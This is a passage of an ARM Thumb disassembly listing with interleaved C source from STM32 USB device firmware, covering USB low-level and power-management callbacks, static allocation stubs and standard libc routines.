 800d114:	2301      	movs	r3, #1
 800d116:	75fb      	strb	r3, [r7, #23]
    break;
 800d118:	e005      	b.n	800d126 <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800d11a:	2303      	movs	r3, #3
 800d11c:	75fb      	strb	r3, [r7, #23]
    break;
 800d11e:	e002      	b.n	800d126 <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800d120:	2303      	movs	r3, #3
 800d122:	75fb      	strb	r3, [r7, #23]
    break;
 800d124:	bf00      	nop
  }
  return usb_status;
 800d126:	7dfb      	ldrb	r3, [r7, #23]
}
 800d128:	4618      	mov	r0, r3
 800d12a:	3718      	adds	r7, #24
 800d12c:	46bd      	mov	sp, r7
 800d12e:	bd80      	pop	{r7, pc}

0800d130 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800d130:	b580      	push	{r7, lr}
 800d132:	b082      	sub	sp, #8
 800d134:	af00      	add	r7, sp, #0
 800d136:	6078      	str	r0, [r7, #4]
 800d138:	460b      	mov	r3, r1
 800d13a:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800d13c:	687b      	ldr	r3, [r7, #4]
 800d13e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800d142:	78fa      	ldrb	r2, [r7, #3]
 800d144:	4611      	mov	r1, r2
 800d146:	4618      	mov	r0, r3
 800d148:	f7f5 f9d8 	bl	80024fc <HAL_PCD_EP_GetRxCount>
 800d14c:	4603      	mov	r3, r0
}
 800d14e:	4618      	mov	r0, r3
 800d150:	3708      	adds	r7, #8
 800d152:	46bd      	mov	sp, r7
 800d154:	bd80      	pop	{r7, pc}
	...

0800d158 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800d158:	b580      	push	{r7, lr}
 800d15a:	b082      	sub	sp, #8
 800d15c:	af00      	add	r7, sp, #0
 800d15e:	6078      	str	r0, [r7, #4]
 800d160:	460b      	mov	r3, r1
 800d162:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800d164:	78fb      	ldrb	r3, [r7, #3]
 800d166:	2b00      	cmp	r3, #0
 800d168:	d002      	beq.n	800d170 <HAL_PCDEx_LPM_Callback+0x18>
 800d16a:	2b01      	cmp	r3, #1
 800d16c:	d013      	beq.n	800d196 <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800d16e:	e023      	b.n	800d1b8 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800d170:	687b      	ldr	r3, [r7, #4]
 800d172:	699b      	ldr	r3, [r3, #24]
 800d174:	2b00      	cmp	r3, #0
 800d176:	d007      	beq.n	800d188 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800d178:	f000 f84a 	bl	800d210 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d17c:	4b10      	ldr	r3, [pc, #64]	; (800d1c0 <HAL_PCDEx_LPM_Callback+0x68>)
 800d17e:	691b      	ldr	r3, [r3, #16]
 800d180:	4a0f      	ldr	r2, [pc, #60]	; (800d1c0 <HAL_PCDEx_LPM_Callback+0x68>)
 800d182:	f023 0306 	bic.w	r3, r3, #6
 800d186:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800d188:	687b      	ldr	r3, [r7, #4]
 800d18a:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d18e:	4618      	mov	r0, r3
 800d190:	f7fe fa66 	bl	800b660 <USBD_LL_Resume>
    break;
 800d194:	e010      	b.n	800d1b8 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800d196:	687b      	ldr	r3, [r7, #4]
 800d198:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d19c:	4618      	mov	r0, r3
 800d19e:	f7fe fa43 	bl	800b628 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800d1a2:	687b      	ldr	r3, [r7, #4]
 800d1a4:	699b      	ldr	r3, [r3, #24]
 800d1a6:	2b00      	cmp	r3, #0
 800d1a8:	d005      	beq.n	800d1b6 <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d1aa:	4b05      	ldr	r3, [pc, #20]	; (800d1c0 <HAL_PCDEx_LPM_Callback+0x68>)
 800d1ac:	691b      	ldr	r3, [r3, #16]
 800d1ae:	4a04      	ldr	r2, [pc, #16]	; (800d1c0 <HAL_PCDEx_LPM_Callback+0x68>)
 800d1b0:	f043 0306 	orr.w	r3, r3, #6
 800d1b4:	6113      	str	r3, [r2, #16]
    break;
 800d1b6:	bf00      	nop
}
 800d1b8:	bf00      	nop
 800d1ba:	3708      	adds	r7, #8
 800d1bc:	46bd      	mov	sp, r7
 800d1be:	bd80      	pop	{r7, pc}
 800d1c0:	e000ed00 	.word	0xe000ed00

0800d1c4 <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800d1c4:	b480      	push	{r7}
 800d1c6:	b083      	sub	sp, #12
 800d1c8:	af00      	add	r7, sp, #0
 800d1ca:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d1cc:	4b03      	ldr	r3, [pc, #12]	; (800d1dc <USBD_static_malloc+0x18>)
}
 800d1ce:	4618      	mov	r0, r3
 800d1d0:	370c      	adds	r7, #12
 800d1d2:	46bd      	mov	sp, r7
 800d1d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d1d8:	4770      	bx	lr
 800d1da:	bf00      	nop
 800d1dc:	20000e74 	.word	0x20000e74

0800d1e0 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800d1e0:	b480      	push	{r7}
 800d1e2:	b083      	sub	sp, #12
 800d1e4:	af00      	add	r7, sp, #0
 800d1e6:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d1e8:	4b03      	ldr	r3, [pc, #12]	; (800d1f8 <USBD_static_malloc_MSC+0x18>)
}
 800d1ea:	4618      	mov	r0, r3
 800d1ec:	370c      	adds	r7, #12
 800d1ee:	46bd      	mov	sp, r7
 800d1f0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d1f4:	4770      	bx	lr
 800d1f6:	bf00      	nop
 800d1f8:	20000e9c 	.word	0x20000e9c

0800d1fc <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800d1fc:	b480      	push	{r7}
 800d1fe:	b083      	sub	sp, #12
 800d200:	af00      	add	r7, sp, #0
 800d202:	6078      	str	r0, [r7, #4]

}
 800d204:	bf00      	nop
 800d206:	370c      	adds	r7, #12
 800d208:	46bd      	mov	sp, r7
 800d20a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d20e:	4770      	bx	lr

0800d210 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800d210:	b580      	push	{r7, lr}
 800d212:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800d214:	f7f3 fda6 	bl	8000d64 <SystemClock_Config>
}
 800d218:	bf00      	nop
 800d21a:	bd80      	pop	{r7, pc}

0800d21c <memset>:
 800d21c:	4402      	add	r2, r0
 800d21e:	4603      	mov	r3, r0
 800d220:	4293      	cmp	r3, r2
 800d222:	d100      	bne.n	800d226 <memset+0xa>
 800d224:	4770      	bx	lr
 800d226:	f803 1b01 	strb.w	r1, [r3], #1
 800d22a:	e7f9      	b.n	800d220 <memset+0x4>

0800d22c <__libc_init_array>:
 800d22c:	b570      	push	{r4, r5, r6, lr}
 800d22e:	4d0d      	ldr	r5, [pc, #52]	; (800d264 <__libc_init_array+0x38>)
 800d230:	4c0d      	ldr	r4, [pc, #52]	; (800d268 <__libc_init_array+0x3c>)
 800d232:	1b64      	subs	r4, r4, r5
 800d234:	10a4      	asrs	r4, r4, #2
 800d236:	2600      	movs	r6, #0
 800d238:	42a6      	cmp	r6, r4
 800d23a:	d109      	bne.n	800d250 <__libc_init_array+0x24>
 800d23c:	4d0b      	ldr	r5, [pc, #44]	; (800d26c <__libc_init_array+0x40>)
 800d23e:	4c0c      	ldr	r4, [pc, #48]	; (800d270 <__libc_init_array+0x44>)
 800d240:	f000 f826 	bl	800d290 <_init>
 800d244:	1b64      	subs	r4, r4, r5
 800d246:	10a4      	asrs	r4, r4, #2
 800d248:	2600      	movs	r6, #0
 800d24a:	42a6      	cmp	r6, r4
 800d24c:	d105      	bne.n	800d25a <__libc_init_array+0x2e>
 800d24e:	bd70      	pop	{r4, r5, r6, pc}
 800d250:	f855 3b04 	ldr.w	r3, [r5], #4
 800d254:	4798      	blx	r3
 800d256:	3601      	adds	r6, #1
 800d258:	e7ee      	b.n	800d238 <__libc_init_array+0xc>
 800d25a:	f855 3b04 	ldr.w	r3, [r5], #4
 800d25e:	4798      	blx	r3
 800d260:	3601      	adds	r6, #1
 800d262:	e7f2      	b.n	800d24a <__libc_init_array+0x1e>
 800d264:	0800d4e8 	.word	0x0800d4e8
 800d268:	0800d4e8 	.word	0x0800d4e8
 800d26c:	0800d4e8 	.word	0x0800d4e8
 800d270:	0800d4ec 	.word	0x0800d4ec

0800d274 <memcpy>:
 800d274:	440a      	add	r2, r1
 800d276:	4291      	cmp	r1, r2
 800d278:	f100 33ff 	add.w	r3, r0, #4294967295
 800d27c:	d100      	bne.n	800d280 <memcpy+0xc>
 800d27e:	4770      	bx	lr
 800d280:	b510      	push	{r4, lr}
 800d282:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d286:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d28a:	4291      	cmp	r1, r2
 800d28c:	d1f9      	bne.n	800d282 <memcpy+0xe>
 800d28e:	bd10      	pop	{r4, pc}

0800d290 <_init>:
 800d290:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d292:	bf00      	nop
 800d294:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d296:	bc08      	pop	{r3}
 800d298:	469e      	mov	lr, r3
 800d29a:	4770      	bx	lr

0800d29c <_fini>:
 800d29c:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d29e:	bf00      	nop
 800d2a0:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d2a2:	bc08      	pop	{r3}
 800d2a4:	469e      	mov	lr, r3
 800d2a6:	4770      	bx	lr
